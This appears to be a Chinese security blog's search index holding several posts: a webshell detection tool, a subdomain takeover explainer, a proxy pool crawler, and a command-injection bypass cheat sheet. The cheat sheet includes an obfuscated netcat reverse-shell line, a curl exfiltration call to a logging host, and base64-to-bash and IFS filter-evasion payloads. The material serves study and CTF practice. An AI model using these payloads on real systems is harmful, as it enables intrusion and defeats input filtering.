<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[webshell检测平台]]></title>
      <url>/2018/07/19/webshell%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0/</url>
      <content type="html"><![CDATA[<h1 id="0x01-相关技术"><a href="#0x01-相关技术" class="headerlink" title="0x01 相关技术"></a>0x01 相关技术</h1><ul>
<li><p>Python</p>
<p>编程语言使用python开发，纯属为了学习编程。</p>
</li>
<li><p>Flask</p>
<p>使用Flask作为Web开发微框架，交与其他Python框架，具有简便、易扩展等优点。具体可看：<a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="external">Flask中文文档</a></p>
</li>
<li><p>MySQL</p>
<p>MySQL 是最流行的关系型数据库管理系统，在WEB应用方面 MySQL 是最好的RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。文档参考：<a href="MySQL 是最流行的关系型数据库管理系统，在WEB应用方面 MySQL 是最好的RDBMS(Relational Database Management System：关系数据库管理系统">MySQL教程</a>应用软件之一)</p>
</li>
<li><p>inotify</p>
<p>从 Linux 2.6.13 内核开始，Linux 就推出了 <em>inotify</em>，允许监控程序打开一个独立文件描述符，并针对事件集监控一个或者多个文件，例如打开、关闭、移动/重命名、删除、创建或者改变属性，文档参考：<a href="https://www.ibm.com/developerworks/cn/linux/l-inotify/index.html" target="_blank" rel="external">用 inotify 监控 Linux 文件系统事件</a></p>
</li>
</ul>
<h1 id="0x02-扫描流程"><a href="#0x02-扫描流程" class="headerlink" title="0x02 扫描流程"></a>0x02 扫描流程</h1><p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell.png" alt=""></p>
<h1 id="0x03-具体实现"><a href="#0x03-具体实现" class="headerlink" title="0x03 具体实现"></a>0x03 具体实现</h1><h2 id="文件监控模块"><a href="#文件监控模块" class="headerlink" title="文件监控模块"></a>文件监控模块</h2><p><img src="http://oa8y5guqs.bkt.clouddn.com/inotify.png" alt=""></p>
<p>使用inotify一直循环监听文件上传的目录，发现新文件立即调用扫描引擎检测。</p>
<h2 id="查杀模块"><a href="#查杀模块" class="headerlink" title="查杀模块"></a>查杀模块</h2><p><img src="http://oa8y5guqs.bkt.clouddn.com/all.png" alt=""></p>
<p>先判断文件大小，文件过大则跳过。</p>
<p>检测规则有两种：</p>
<ul>
<li><p>当type等于1时，是使用的是静态匹配；</p>
</li>
<li><p>当type等于2时，是使用的正则匹配，正则匹配需满足所有正则条件才算成功匹配；</p>
</li>
</ul>
<p>扫描结束后，将结果插入数据库。</p>
<p>其中检测规则使用的是@haozige之前逆向的阿里云、腾讯云的webshell检测规则：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/rule.png" alt=""></p>
<h1 id="0x04-Todo"><a href="#0x04-Todo" class="headerlink" title="0x04 Todo"></a>0x04 Todo</h1><p>1、机器学习检测webshell：<a href="https://xz.aliyun.com/t/2016" target="_blank" rel="external">深度学习PHP webshell查杀引擎demo</a></p>
<p>2、语义分析（旁路、沙盒）检测webshell：<a href="http://byd.dropsec.xyz/2017/04/27/Webshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/">Webshell查杀的新思路</a></p>
<p>3、基于流量模式检测webshell（做agent的话很有用）</p>
<p>4、逆向算法+静态匹配检测webshell：<a href="http://www.d99net.net/" target="_blank" rel="external">D盾webshell查杀</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> MySQL </tag>
            
            <tag> Flask </tag>
            
            <tag> inotify </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[子域名劫持（Subdomain takeover）]]></title>
      <url>/2018/07/12/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%EF%BC%88Subdomain-takeover%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>学到了一个新的漏洞类型，记录学习下</p>
<h1 id="0x01-域名解析"><a href="#0x01-域名解析" class="headerlink" title="0x01 域名解析"></a>0x01 域名解析</h1><p>域名解析是由DNS协议完成的，包含了多种记录类型，比如：</p>
<ul>
<li><p>A (Address) 记录：指明域名对应的哪个IP</p>
</li>
<li><p>NS记录：指明由哪台服务器对该域名进行解析</p>
</li>
<li><p>CNAME记录：别名记录，将一个域名映射到另一个域名的记录（比如：张晓明的小名叫小明，小名和晓明都是同一个人）</p>
</li>
</ul>
<h1 id="0x02-子域名劫持原理"><a href="#0x02-子域名劫持原理" class="headerlink" title="0x02 子域名劫持原理"></a>0x02 子域名劫持原理</h1><p>怎么简单怎么说：</p>
<blockquote>
<p>比如：子域名test.example.com通过CNAME记录指向一个比如testcdn.img.aliyun.com域名，但该主机名已经不存在或者过期了，这样我们就可以注册、创建一个这个不存在的testcdn.img.aliyun.com域名，达到子域名劫持的目的</p>
</blockquote>
<h1 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a>0x03 漏洞检测</h1><p>子域名劫持漏洞检测有三种方法：</p>
<h2 id="1、使用dig、nslookup"><a href="#1、使用dig、nslookup" class="headerlink" title="1、使用dig、nslookup"></a>1、使用dig、nslookup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># nslookup ping.ubnt.com 8.8.8.8</div><div class="line">Server:     8.8.8.8</div><div class="line">Address:    8.8.8.8#53</div><div class="line"></div><div class="line">Non-authoritative answer:</div><div class="line">ping.ubnt.com   canonical name = dl.ubnt.com.</div><div class="line">dl.ubnt.com canonical name = d2cnv2pop2xy4v.cloudfront.net.</div><div class="line">Name:   d2cnv2pop2xy4v.cloudfront.net</div><div class="line">Address: 54.192.96.244</div><div class="line"></div><div class="line"># dig example.com  | grep CNAME</div><div class="line">example.com. 3027 IN  CNAME   example.cloudfront.net.</div></pre></td></tr></table></figure>
<p>然后访问出现的CNAME记录值，如果显示不存在，那么Congratulations！</p>
<h2 id="2、直接访问子域名"><a href="#2、直接访问子域名" class="headerlink" title="2、直接访问子域名"></a>2、直接访问子域名</h2><p>如果出现类似下面这种情况，那么Congratulations！</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/takeover.png" alt=""></p>
<h2 id="3、使用工具-aquatone"><a href="#3、使用工具-aquatone" class="headerlink" title="3、使用工具-aquatone"></a>3、使用工具-aquatone</h2><p>直接使用<code>aquatone-takeover —d target.com</code>即可</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/takeover1.png" alt=""></p>
<h1 id="0x04-漏洞危害"><a href="#0x04-漏洞危害" class="headerlink" title="0x04 漏洞危害"></a>0x04 漏洞危害</h1><h2 id="1、认证劫持、钓鱼"><a href="#1、认证劫持、钓鱼" class="headerlink" title="1、认证劫持、钓鱼"></a>1、认证劫持、钓鱼</h2><p>由于攻击者已经控制了该子域名，那么攻击者就可以构造特定的页面诱导用户操作，比如登陆表单、密码表单等，由于是完全正常的可信的域名，所以很难以分别是否存在钓鱼。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/takeover2.png" alt=""></p>
<h2 id="2、会话劫持"><a href="#2、会话劫持" class="headerlink" title="2、会话劫持"></a>2、会话劫持</h2><p>这种对那些大型企业危害巨大，现在很多网站使用单点登陆（SSO），那么Cookie就是在整个域中共享的，那么攻击者只需要接受到用户的Cookie，即可操作其他域名了。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 子域名劫持 </tag>
            
            <tag> takeover </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[命令执行绕过之Linux通配符]]></title>
      <url>/2018/05/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E4%B9%8BLinux%E9%80%9A%E9%85%8D%E7%AC%A6/</url>
      <content type="html"><![CDATA[<p>前几天在微博和公众号上看到一些使用Linux通配符/glob模式来绕过命令执行的方式，感觉很不错，学习总结下。</p>
<p>首先先了解下什么是Linux shell 通配符/glob模式:</p>
<p><strong>概念：</strong></p>
<blockquote>
<p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 <code>/etc/glob</code> （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。<strong>shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！</strong></p>
</blockquote>
<p><strong>语法：</strong></p>
<table>
<thead>
<tr>
<th>字符</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>匹配任意长度任意字符</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配任意单个字符</td>
</tr>
<tr>
<td><code>[list]</code></td>
<td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td><code>[^list]</code></td>
<td>匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td><code>[!list]</code></td>
<td>同<code>[^list]</code></td>
</tr>
<tr>
<td><code>{str1,str2,…}</code></td>
<td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
</tr>
</tbody>
</table>
<p><strong>专用字符集</strong></p>
<table>
<thead>
<tr>
<th>字符</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[:alnum:]</code></td>
<td>任意数字或者字母</td>
</tr>
<tr>
<td><code>[:alpha:]</code></td>
<td>任意字母</td>
</tr>
<tr>
<td><code>[:space:]</code></td>
<td>空格</td>
</tr>
<tr>
<td><code>[:lower:]</code></td>
<td>小写字母</td>
</tr>
<tr>
<td><code>[:digit:]</code></td>
<td>任意数字</td>
</tr>
<tr>
<td><code>[:upper:]</code></td>
<td>任意大写字母</td>
</tr>
<tr>
<td><code>[:cntrl:]</code></td>
<td>控制符</td>
</tr>
<tr>
<td><code>[:graph:]</code></td>
<td>图形</td>
</tr>
<tr>
<td><code>[:print:]</code></td>
<td>可打印字符</td>
</tr>
<tr>
<td><code>[:punct:]</code></td>
<td>标点符号</td>
</tr>
<tr>
<td><code>[:xdigit:]</code></td>
<td>十六进制数</td>
</tr>
<tr>
<td><code>[:blank:]</code></td>
<td>空白字符（未验证）</td>
</tr>
</tbody>
</table>
<p>Linux shell 元字符，在使用通配符时如果没有进行转义可能就会被辨识为元字符</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>IFS</code></td>
<td>由 <code>&lt; space &gt;</code> 或 <code>&lt; tab &gt;</code>或 <code>&lt; enter &gt;</code> 三者之一组成</td>
</tr>
<tr>
<td><code>CR</code></td>
<td>由 <code>&lt; enter &gt;</code> 产生</td>
</tr>
<tr>
<td><code>=</code></td>
<td>设定变量</td>
</tr>
<tr>
<td><code>$</code></td>
<td>作变量或运算替换</td>
</tr>
<tr>
<td><code>&gt;</code></td>
<td>重导向标准输出</td>
</tr>
<tr>
<td><code>&lt;</code></td>
<td>重导向标准输入</td>
</tr>
<tr>
<td>`\</td>
<td>`</td>
<td>命令管线</td>
</tr>
<tr>
<td><code>&amp;</code></td>
<td>重导向文件描述符，或将命令静默执行</td>
</tr>
<tr>
<td><code>( )</code></td>
<td>将其内的命令置于 nested subshell 执行，或用于运算或命令替换</td>
</tr>
<tr>
<td><code>{ }</code></td>
<td>将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围</td>
</tr>
<tr>
<td><code>;</code></td>
<td>在前一个命令结束时，而忽略其返回值，继续执行下一个命令</td>
</tr>
<tr>
<td><code>&amp;&amp;</code></td>
<td>在前一个命令结束时，若返回值为 true，继续执行下一个命令</td>
</tr>
<tr>
<td>`\</td>
<td>\</td>
<td>`</td>
<td>在前一个命令结束时，若返回值为 false，继续执行下一个命令</td>
</tr>
<tr>
<td><code>!</code></td>
<td>执行 history 中的命令</td>
</tr>
</tbody>
</table>
<p><strong>示例：</strong></p>
<p><em>举几个简单的例子，举一反三，同理，各种混合结合效果更佳！</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell  ls a*?</div><div class="line">abc.txt</div><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[l]s</div><div class="line">12.txt	abc.txt</div><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[:lower:]s</div><div class="line">12.txt	abc.txt</div><div class="line">再比如：</div><div class="line">/?s?/???/[n]c 2130706433 8888 -e /???/b??h</div><div class="line">...</div></pre></td></tr></table></figure>
<p><strong>其他绕过方式</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">ls | id</div><div class="line">ls ; id    在shell中，担任&quot;连续指令&quot;功能的符号就是&quot;分号&quot;</div><div class="line">ls &amp; id</div><div class="line">ls 回车 id</div><div class="line">ls `id`   </div><div class="line">ls ` id`   前面加了一个空格</div><div class="line">ls `\id`   反斜杠  i\d等价于id</div><div class="line">ls $(id)</div><div class="line">ls | a=i;b=d;$a$b   拼接</div><div class="line">ls | echo aWQ=| base64 -d | bash   利用base64</div><div class="line">`echo &quot;aWQ=&quot;|base64 -d`</div><div class="line">ls | curl xxx.ceye.io/`whoami`   利用dnslog或者http web log</div><div class="line">cat&lt;1.txt</div><div class="line">cat$IFS$91.txt</div><div class="line">cat$&#123;IFS&#125;1.txt</div><div class="line">cat$IFS1.txt</div><div class="line">%0acat%091.txt</div><div class="line">w&apos;h&apos;o&apos;am&apos;i</div><div class="line">w&quot;h&quot;o&quot;am&quot;i</div><div class="line">who$@ami</div><div class="line">echo i$@d|$0</div><div class="line">w$@h$@o$@a$@m$@i</div></pre></td></tr></table></figure>
<p><strong>注意事项</strong></p>
<ul>
<li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如 [[:space:]]</li>
<li>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</li>
<li>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</li>
</ul>
<p><strong>Referer：</strong></p>
<p><a href="https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html" target="_blank" rel="external">https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html</a></p>
<p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank" rel="external">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> linux </tag>
            
            <tag> 通配符 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PrxoyPool-免费代理池的设计与实现]]></title>
      <url>/2018/04/27/PrxoyPool-%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在进行渗透测试、漏洞挖掘的时候，使用自动化工具是必须的一步，但是令人😠的是，经常由于扫描等原因导致IP被ban，这是我们最不想看到的。所以本着学习编程的目的，根据网上搜索的资料，东拼西凑的开发了这个系统。</p>
<h2 id="0x01-涉及技术"><a href="#0x01-涉及技术" class="headerlink" title="0x01 涉及技术"></a>0x01 涉及技术</h2><ul>
<li><p>Python3</p>
<p>使用Python3的原因是由于异步IO使用的是<code>asyncio</code>和<code>aiohttp</code>，所以就学习尝试了下Python3，其实没多大区别感觉。（刚开始学编程，原谅我啥都不知道😜）</p>
</li>
<li><p>Flask</p>
<p>使用Flask作为Web开发微框架，交与其他Python框架，具有简便、易扩展等优点。具体可看：<a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="external">Flask中文文档</a></p>
</li>
<li><p>Redis</p>
<p>Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。</p>
<p>五种类型数据类型为：字符串、列表、集合、有序集合、散列表。本次数据存储方面就利用的redis的有序集合。</p>
</li>
<li><p>爬虫</p>
<p>爬虫部分是从11个免费代理网站上抓取免费、高可用性的代理IP，并进行数据处理获取统一格式。同时本着学习的理念使用了：<code>lxml</code>，<code>pyquery</code>，<code>正则</code>，<code>json</code>等不同的技术来实现。</p>
</li>
<li><p>异步IO</p>
<p>默认给代理池设置的阈值为50000，由于数量比较大，为了提高代理高可用性的检测效率，我们在这里使用异步请求库aiohttp来进行检测。具体参考：<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000" target="_blank" rel="external">廖雪峰的官方网站-异步IO</a></p>
</li>
<li><p>前端</p>
<p>web前端部分我是真不懂（但是我会抄啊😝），直接wget的一个自己觉得比较简洁的网站的前端，哈哈😄～</p>
</li>
</ul>
<h2 id="0x02-架构部分"><a href="#0x02-架构部分" class="headerlink" title="0x02 架构部分"></a>0x02 架构部分</h2><p> <img src="http://oa8y5guqs.bkt.clouddn.com/jiagou.png" alt=""></p>
<p>主要分为如下几个模块：</p>
<ul>
<li><p>爬虫模块：</p>
<p>主要从11个免费代理网站上抓取免费的代理IP，并进行格式统一处理。同时为了保证代理池的枯竭，采用周期性抓取。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">www.66ip.cn</div><div class="line">www.xdaili.cn</div><div class="line">www.kuaidaili</div><div class="line">www.ip3366.net</div><div class="line">www.89ip.cn</div><div class="line">www.xicidaili.com</div><div class="line">www.iphai.com</div><div class="line">premproxy.com</div><div class="line">www.xroxy.com</div><div class="line">www.data5u.com</div><div class="line">www.kxdaili.com</div></pre></td></tr></table></figure>
</li>
<li><p>存储模块</p>
<p>主要学习了GitHub上一个采用的redis的有序集合来进行的，一是保证代理数据的不重复，二是使用<code>zscore</code>来标记代理的可用性。</p>
</li>
<li><p>检测模块</p>
<p>定时检测数据库中的代理的可用性情况，并采用打分机制，初始化一个分值，若可用则标记为最高，不可用则在初始化分值基础上减1，直到为0，则从redis中删除。后续random获取的时候采用分值最高的优先展示的从高到低模式。同时保证代理的实时可用性，设置定时检测。</p>
</li>
<li><p>API模块</p>
<p>采用<code>Flask</code>作为web服务器，前端copy的别人的改的。从redis数据库中优先选择出分数最高的，若同时存在多个，则随机选择一个。</p>
</li>
</ul>
<p>​</p>
<h2 id="0x03-具体实现"><a href="#0x03-具体实现" class="headerlink" title="0x03 具体实现"></a>0x03 具体实现</h2><h3 id="爬虫模块"><a href="#爬虫模块" class="headerlink" title="爬虫模块"></a>爬虫模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">def crawl_daili66(self, page_count=4):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    获取代理:www.66ip.cn</div><div class="line">    方法:pyquery</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    start_url = &apos;http://www.66ip.cn/&#123;&#125;.html&apos;</div><div class="line">    urls = [start_url.format(page) for page in range(1, page_count + 1)]</div><div class="line">    for url in urls:</div><div class="line">        html = get_page(url)</div><div class="line">        if html:</div><div class="line">            doc = pq(html)</div><div class="line">            trs = doc(&apos;.containerbox table tr:gt(0)&apos;).items()</div><div class="line">            for tr in trs:</div><div class="line">                ip = tr.find(&apos;td:nth-child(1)&apos;).text()</div><div class="line">                port = tr.find(&apos;td:nth-child(2)&apos;).text()</div><div class="line">                yield &apos;:&apos;.join([ip, port])</div><div class="line"></div><div class="line">def crawl_ip181(self, page_count=2):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    获取代理:www.xdaili.cn</div><div class="line">    方法:json</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    start_url = &apos;http://www.xdaili.cn/ipagent//freeip/getFreeIps?page=&#123;&#125;&apos;</div><div class="line">    urls = [start_url.format(page) for page in range(1, page_count + 1)]</div><div class="line">    for url in urls:</div><div class="line">        try:</div><div class="line">            response = requests.get(url)</div><div class="line">            print(&apos;抓取成功 &gt;&gt;&gt; &apos;, url, response.status_code)</div><div class="line">            if response.status_code == 200:</div><div class="line">                html = response.json()</div><div class="line">        except ConnectionError:</div><div class="line">            print(&apos;抓取失败 &gt;&gt;&gt; &apos;, url)</div><div class="line">            pass</div><div class="line">        if html:</div><div class="line">            # ip_address = re.compile(r&apos;&quot;ip&quot;:&quot;(.*?)&quot;,&quot;port&quot;:&quot;(.*?)&quot;&apos;)</div><div class="line">            # ip_address = ip_address.findall(html)</div><div class="line">            for key in html[&apos;RESULT&apos;][&apos;rows&apos;]:</div><div class="line">                yield &apos;:&apos;.join([key[&apos;ip&apos;], key[&apos;port&apos;]])</div><div class="line"></div><div class="line">def crawl_kuaidaili(self):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    获取代理:www.kuaidaili</div><div class="line">    方法:xpath</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for i in range(1, 4):</div><div class="line">        start_url = &apos;http://www.kuaidaili.com/free/inha/&#123;&#125;/&apos;.format(i)</div><div class="line">        html = get_page(start_url)</div><div class="line">        if html:</div><div class="line">            html = etree.HTML(html, parser=etree.HTMLParser(encoding=&apos;utf-8&apos;))</div><div class="line">            _ip_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[1]/text()&apos;</div><div class="line">            _port_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[2]/text()&apos;</div><div class="line">            for i in range(1, 16):</div><div class="line">                ip_xpath = _ip_xpath.format(i)</div><div class="line">                port_xpath = _port_xpath.format(i)</div><div class="line">                ip = html.xpath(ip_xpath)[0]</div><div class="line">                port = html.xpath(port_xpath)[0]</div><div class="line">                yield &quot;:&quot;.join([ip, port])</div><div class="line"></div><div class="line">def crawl_ip3366(self):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    获取代理:www.ip3366.net</div><div class="line">    方法:正则</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for page in range(1, 4):</div><div class="line">        start_url = &apos;http://www.ip3366.net/free/?stype=1&amp;page=&#123;&#125;&apos;.format(page)</div><div class="line">        html = get_page(start_url)</div><div class="line">        ip_address = re.compile(&apos;&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;&apos;)</div><div class="line">        re_ip_address = ip_address.findall(html)</div><div class="line">        for address, port in re_ip_address:</div><div class="line">            result = address + &apos;:&apos; + port</div><div class="line">            yield result.replace(&apos; &apos;, &apos;&apos;)</div></pre></td></tr></table></figure>
<p>本着学习的目的，同时采用了<code>pyquery</code>，<code>正则</code>，<code>json</code>，<code>xpath</code>等不同的获取方法，使用<code>yield</code>来将这些方法定义成生成器，这样我们每次请求就会通过<code>yield</code>来返回一个代理IP。</p>
<p>同时使用<code>crawl_</code>开头的函数命名方法，来达到动态添加代理网站地址接口的目的（这部分借鉴的大神的），具体参考：<a href="https://blog.csdn.net/permike/article/details/52211721" target="_blank" rel="external">python元类解析</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">class ProxyMetaclass(type):</div><div class="line">    def __new__(cls, name, bases, attrs):</div><div class="line">        count = 0</div><div class="line">        attrs[&apos;__CrawlFunc__&apos;] = []</div><div class="line">        for k, v in attrs.items():</div><div class="line">            if &apos;crawl_&apos; in k:</div><div class="line">                attrs[&apos;__CrawlFunc__&apos;].append(k)</div><div class="line">                count += 1</div><div class="line">        attrs[&apos;__CrawlFuncCount__&apos;] = count</div><div class="line">        return type.__new__(cls, name, bases, attrs)</div><div class="line"></div><div class="line"></div><div class="line">class Crawler(object, metaclass=ProxyMetaclass):</div><div class="line">    def get_proxies(self, callback):</div><div class="line">        proxies = []</div><div class="line">        for proxy in eval(&quot;self.&#123;&#125;()&quot;.format(callback)):</div><div class="line">            print(u&apos;成功获取到代理 &gt;&gt;&gt; &apos;, proxy)</div><div class="line">            proxies.append(proxy)</div><div class="line">        return proxies</div></pre></td></tr></table></figure>
<p>定义类ProxyMetaclass并声明一个<code>__new__</code>方法，同时Crawler类将它声明为元类，这个方法有固定的几个参数<code>cls, name, bases, attrs</code>，第四个参数<code>attrs</code>中包含了类的一些属性。我们可以遍历<code>attrs</code>这个参数即可获取类的所有方法信息，就像遍历字典一样，键名对应方法的名称。然后判断方法的开头是否<code>crawl_</code>，如果是，则将其加入到<code>__CrawlFunc__</code>属性中。这样我们就成功将所有以<code>crawl_</code>开头的方法定义成了一个属性，动态获取到所有以<code>crawl_</code>开头的方法列表。</p>
<p>然后定义了一个<code>get_proxies()</code>方法，将所有以<code>crawl_</code>开头的方法调用一遍，获取每个方法返回的代理并组合成列表形式返回。</p>
<h3 id="存储模块"><a href="#存储模块" class="headerlink" title="存储模块"></a>存储模块</h3><p>采用redis的有序集合，集合的特点是集合的每一个元素都是不重复的，这样就保证了代理的不重复。有序集合，顾名思义，这里存储的数据是有序的，我们就可以利用这点对代理IP进行打分、排序，实现权重的效果。具体可参考：<a href="http://www.runoob.com/redis/redis-sorted-sets.html" target="_blank" rel="external">Redis 有序集合(sorted set)</a></p>
<p>连接redis</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=True)</div></pre></td></tr></table></figure>
<p>添加数据，添加代理，设置分数为最高</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def add(self, proxy, score=INITIAL_SCORE):</div><div class="line">    if not re.match(&apos;\d+\.\d+\.\d+\.\d+\:\d+&apos;, proxy):</div><div class="line">        print(&apos;代理不符合规范&apos;, proxy, u&apos;丢弃&apos;)</div><div class="line">        return</div><div class="line">    if not self.db.zscore(REDIS_KEY, proxy):</div><div class="line">        return self.db.zadd(REDIS_KEY, score, proxy)</div></pre></td></tr></table></figure>
<p>获取代理IP，随机获取有效代理，首先尝试获取最高分数代理，如果不存在，按照排名获取，否则异常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def random(self):</div><div class="line">    result = self.db.zrangebyscore(REDIS_KEY, MAX_SCORE, MAX_SCORE)</div><div class="line">    if len(result):</div><div class="line">        return choice(result)</div><div class="line">    else:</div><div class="line">        result = self.db.zrevrange(REDIS_KEY, 0, 100)</div><div class="line">        if len(result):</div><div class="line">            return choice(result)</div><div class="line">        